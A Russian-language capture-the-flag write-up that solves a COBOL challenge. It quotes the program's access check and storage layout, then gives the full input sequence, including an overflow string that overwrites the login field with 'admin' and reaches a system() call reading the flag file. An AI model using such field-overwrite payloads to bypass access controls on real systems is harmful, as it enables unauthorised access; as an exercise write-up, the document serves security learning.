```sh
$   2
$   test
$   test
$   4
$   N
$   N
$   N
$   aaaaaaaaaaaaaaaaaaaaaaaaaaaaaab00admin
$   N
$   9
$   3               # для проверки
$   5
```

В исходниках видим следующую функцию проверки:
```cobol
OPEN-STORAGE.
  DISPLAY "Trying to open the storage...".
  IF LOGIN = "admin" AND VIP = 1
    CALL "system" USING "cat /root/storage/storage.txt"
  ELSE
    DISPLAY "You are not allowed!"
  END-IF.
```

То есть, наша задача - залогиниться под пользователем __admin__ с полем VIP==1

Для VIP используем скрытую кнопку `88 SECRET VALUE "9".`
После пытаемся поменять имя пользователя.
Залогиниться мы можем только под логином test, но существует возможность поменять его в функции "4. Change info."

При этом, залогиниться под __admin__ мы не можем:
```cobol
IF TMPLOGIN = "admin"
	    DISPLAY "No no no. Go away."
		MOVE SPACE to TMPLOGIN
```

Изучаем структуру, в которой хранится имя пользователя:
```cobol
WORKING-STORAGE SECTION.
  01 SUBPRG.
	02 TMPABOUT PIC X(30).
    02 TMPCHOICE PIC X(1).
	02 TMPAGE PIC 99.
	02 TMPLOGIN PIC X(10).
	02 TMPPASSW PIC X(10).
  01 TMPABOUT2 REDEFINES SUBPRG PIC X(40).
```

Наибольшее внимание представляет собой переменная TMPABOUT2, которую мы можем контролировать:
```cobol
DISPLAY "Are you sure? [Y/N]: " NO ADVANCING
	  ACCEPT TMPCHOICE
	  IF TMPCHOICE = "N"
	    DISPLAY "Information about you? "
	    ACCEPT TMPABOUT2
```

Понимаем, что с помощью этой переменной можно переполнить первые 40 значений структуры __SUBPRG__: `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaab00admin`

Получив имя пользователя admin и VIP=1, можем успешно выполнить функцию "5. Open the storage." и получить флаг.
